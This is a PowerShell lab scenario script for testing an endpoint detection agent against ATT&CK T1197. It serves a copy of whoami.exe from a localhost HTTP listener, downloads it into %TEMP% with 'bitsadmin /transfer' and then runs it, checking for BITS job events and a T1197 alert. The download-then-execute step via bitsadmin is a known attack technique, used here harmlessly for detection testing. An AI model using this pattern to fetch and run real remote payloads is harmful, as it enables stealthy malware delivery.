<#
.SYNOPSIS
    BITS download-then-exec scenario for T1197 (#284).

.DESCRIPTION
    Asserts the Bits-Client ETW path end to end: `bitsadmin /transfer` fetches
    a copy of whoami.exe from a local HTTP listener into %TEMP%, then runs it.
    The sensor reports the job (BitsJob file_added, then completed) and the
    T1197 download->exec join fires on the exec. BITS does the download from
    its own service, so without the Bits-Client provider nothing ties the file
    to bitsadmin.exe.

    The listener answers HEAD and ranged GETs: BITS sizes the file with a HEAD
    and fetches it with Range requests. Benign by construction: the "payload"
    is whoami.exe, and the only network traffic is to localhost.

    With -MicrosoftJob (needs internet), a second job fetches
    http://www.msftconnecttest.com/connecttest.txt: a Microsoft update host,
    so the sensor must drop it, with no bits_job event for that job.

.NOTES
    Self-checking run (elevated, no other agent running): the script writes a
    lab agent.toml, starts the agent, runs the scenario, stops the agent and
    prints PASS/FAIL per expectation (exit code 1 on any FAIL):
        cargo build --release -p agent
        powershell -ExecutionPolicy Bypass -File lab\scenarios\bits-job.ps1 -AgentExe target\release\agent.exe -MicrosoftJob

    Expected:
        - two "bits_job" events for job "synthaea284", file_added then
          completed, comm bitsadmin.exe, url http://localhost:<port>/payload284.exe
        - one alert: T1197 -- pid=<p> comm=payload284.exe executes
          ...\payload284.exe, <n>s earlier by BITS job "synthaea284" of
          pid=<b> comm=bitsadmin.exe
        - with -MicrosoftJob: no bits_job event for synthaea284ms

    Without -AgentExe (any user, against an agent you started yourself), the
    script only runs the scenario, then prints the Bits-Client/Operational
    records for its jobs (16403 file added, 4 completed) as a self-check.

.LINK
    ATT&CK T1197 -- https://attack.mitre.org/techniques/T1197/
#>
[CmdletBinding()]
param(
    [int]$Port = 18284,
    [switch]$MicrosoftJob,
    [string]$AgentExe = "",
    [string]$OutDir = ""
)

$ErrorActionPreference = "Stop"
. (Join-Path $PSScriptRoot "common.ps1")
Set-StrictMode -Version Latest

$JobName = "synthaea284"
$Source = "$env:SystemRoot\System32\whoami.exe"
$Target = Join-Path $env:TEMP "payload284.exe"
$Url = "http://localhost:$Port/payload284.exe"

# -- Agent harness (-AgentExe, Start-ScenarioAgent in common.ps1) ---------------

function Start-BitsAgent {
    Assert-Administrator "-AgentExe needs an elevated PowerShell: the agent's ETW session needs Administrator."
    $dir = $OutDir
    if (-not $dir) { $dir = Join-Path $PSScriptRoot ("..\..\target\lab-validation\bits-" + (Get-Date -Format "yyyyMMdd-HHmmss")) }
    Start-ScenarioAgent -AgentExe $AgentExe -Dir $dir -PipeName "synthaea-lab-bits"
}

function Test-ScenarioAgent($Agent) {
    $jobs = @(Get-Content -LiteralPath $Agent.Events | Where-Object { $_.StartsWith('{"type":"bits_job"') } |
        ForEach-Object { $_ | ConvertFrom-Json })
    $ours = @($jobs | Where-Object { $_.job_title -eq $JobName })
    $states = ($ours | ForEach-Object { $_.state }) -join ","
    $results = @()
    $results += [pscustomobject]@{
        Check = "bits_job file_added + completed for $JobName"
        Pass = ($states -eq "file_added,completed") -and (@($ours | Where-Object { $_.meta.comm -ne "bitsadmin.exe" }).Count -eq 0)
        Detail = "states=[$states] comm=[$(($ours | ForEach-Object { $_.meta.comm } | Select-Object -Unique) -join ',')] ($($jobs.Count) bits_job events in all)"
    }
    $t1197 = @()
    if (Test-Path $Agent.Alerts) {
        $t1197 = @(Get-Content -LiteralPath $Agent.Alerts | Where-Object { $_ } | ForEach-Object { $_ | ConvertFrom-Json } |
            Where-Object { $_.technique -eq "T1197" -and $_.message -match "payload284\.exe" })
    }
    $results += [pscustomobject]@{
        Check = "one T1197 alert for payload284.exe"
        Pass = $t1197.Count -eq 1
        Detail = if ($t1197.Count) { $t1197[0].message } else { "none" }
    }
    if ($MicrosoftJob) {
        $msJobs = @($jobs | Where-Object { $_.job_title -eq "${JobName}ms" })
        $results += [pscustomobject]@{
            Check = "no bits_job for the Microsoft-host job ${JobName}ms"
            Pass = $msJobs.Count -eq 0
            Detail = "$($msJobs.Count) event(s)"
        }
    }
    Write-Host ""
    foreach ($r in $results) {
        $verdict = if ($r.Pass) { "PASS" } else { "FAIL" }
        Write-Host ("{0}  {1}: {2}" -f $verdict, $r.Check, $r.Detail) -ForegroundColor $(if ($r.Pass) { "Green" } else { "Red" })
    }
    @($results | Where-Object { -not $_.Pass }).Count -eq 0
}

# -- Scenario ------------------------------------------------------------------

function Invoke-BitsScenario {
    # The listener serves from its own runspace: bitsadmin /transfer blocks
    # until the job is done, and BITS makes several requests (HEAD, then
    # ranged GETs). It is created here so the cleanup can stop it: stopping the
    # runspace alone does not interrupt a blocked GetContext().
    $listener = New-Object System.Net.HttpListener
    $listener.Prefixes.Add("http://localhost:$Port/")
    $listener.Start()
    $listenerScript = {
        param($Listener, $Bytes)
        try {
            while ($Listener.IsListening) {
                $context = $Listener.GetContext()
                $response = $context.Response
                $response.Headers.Add("Accept-Ranges", "bytes")
                $response.ContentType = "application/octet-stream"
                $first = 0
                $last = $Bytes.Length - 1
                $range = $context.Request.Headers["Range"]
                if ($range -match "^bytes=(\d+)-(\d*)$") {
                    $first = [int64]$Matches[1]
                    if ($Matches[2]) { $last = [Math]::Min([int64]$Matches[2], $last) }
                    $response.StatusCode = 206
                    $response.Headers.Add("Content-Range", "bytes $first-$last/$($Bytes.Length)")
                }
                $count = $last - $first + 1
                $response.ContentLength64 = $count
                if ($context.Request.HttpMethod -ne "HEAD") {
                    $response.OutputStream.Write($Bytes, $first, $count)
                }
                $response.Close()
            }
        }
        catch [System.Net.HttpListenerException] {
            # Stop() from the cleanup: the blocked GetContext() returns here.
        }
    }

    $server = [PowerShell]::Create()
    [void]$server.AddScript($listenerScript).AddArgument($listener).AddArgument([IO.File]::ReadAllBytes($Source))
    $handle = $server.BeginInvoke()
    try {
        Start-Sleep -Seconds 1
        if ($handle.IsCompleted) {
            $server.EndInvoke($handle)
            throw "the HTTP listener runspace exited at once"
        }
        Remove-Item -LiteralPath $Target -Force -ErrorAction SilentlyContinue

        Write-Host "bitsadmin /transfer $JobName $Url -> $Target"
        Invoke-Native bitsadmin.exe @("/transfer", $JobName, "/download", "/priority", "foreground", $Url, $Target)
        if (-not (Test-Path -LiteralPath $Target)) { throw "bitsadmin reported success but $Target is missing" }

        Write-Host "running $Target"
        & $Target | Out-Null
        if ($LASTEXITCODE -ne 0) { throw "$Target failed with exit code $LASTEXITCODE" }

        if ($MicrosoftJob) {
            $msTarget = Join-Path $env:TEMP "connecttest284.txt"
            Write-Host "bitsadmin /transfer ${JobName}ms (Microsoft host, must be filtered)"
            Invoke-Native bitsadmin.exe @("/transfer", "${JobName}ms", "/download", "/priority", "foreground",
                "http://www.msftconnecttest.com/connecttest.txt", $msTarget)
            Remove-Item -LiteralPath $msTarget -Force -ErrorAction SilentlyContinue
        }
    }
    finally {
        $listener.Stop()
        $listener.Close()
        [void]$handle.AsyncWaitHandle.WaitOne(5000)
        $server.Dispose()
        Remove-Item -LiteralPath $Target -Force -ErrorAction SilentlyContinue
    }
}

function Show-BitsLogRecords([datetime]$Since) {
    # What the Bits-Client log recorded for our jobs: the same records the
    # sensor reads over ETW.
    Start-Sleep -Seconds 1
    $records = @(Get-WinEvent -LogName "Microsoft-Windows-Bits-Client/Operational" -ErrorAction SilentlyContinue |
        Where-Object { $_.TimeCreated -ge $Since -and $_.Id -in 4, 5, 16403, 61 } |
        Where-Object { ([xml]$_.ToXml()).Event.EventData.Data | Where-Object { $_.InnerText -like "$JobName*" } })
    Write-Host ""
    Write-Host "Bits-Client records for ${JobName}*: $($records.Count)"
    foreach ($record in ($records | Sort-Object TimeCreated)) {
        $data = @{}
        # InnerText, not '#text': an empty <Data/> has no '#text' and strict mode throws.
        ([xml]$record.ToXml()).Event.EventData.Data | ForEach-Object { $data[$_.Name] = $_.InnerText }
        Write-Host ("  EID {0,-5} {1,-14} processId={2} {3} {4}" -f $record.Id, $data["jobTitle"], $data["processId"], $data["RemoteName"], $data["LocalName"])
    }
    if (@($records | Where-Object { $_.Id -eq 16403 }).Count -eq 0) {
        Write-Warning "no 16403 (file added) record: the sensor has nothing to report either"
    }
}

$agent = $null
$started = Get-Date
try {
    if ($AgentExe) { $agent = Start-BitsAgent }
    Invoke-BitsScenario
    if ($agent) { Start-Sleep -Seconds 8 }
}
finally {
    Stop-ScenarioAgent $agent
}
Show-BitsLogRecords $started

if ($agent) {
    if (-not (Test-ScenarioAgent $agent)) {
        Write-Host "see $($agent.Dir) (events.jsonl, alerts.ndjson, stderr.log)"
        exit 1
    }
}
else {
    Write-Host ""
    Write-Host "Done. Expected from the agent: bits_job file_added + completed for $JobName,"
    Write-Host "then one T1197 alert for payload284.exe."
}
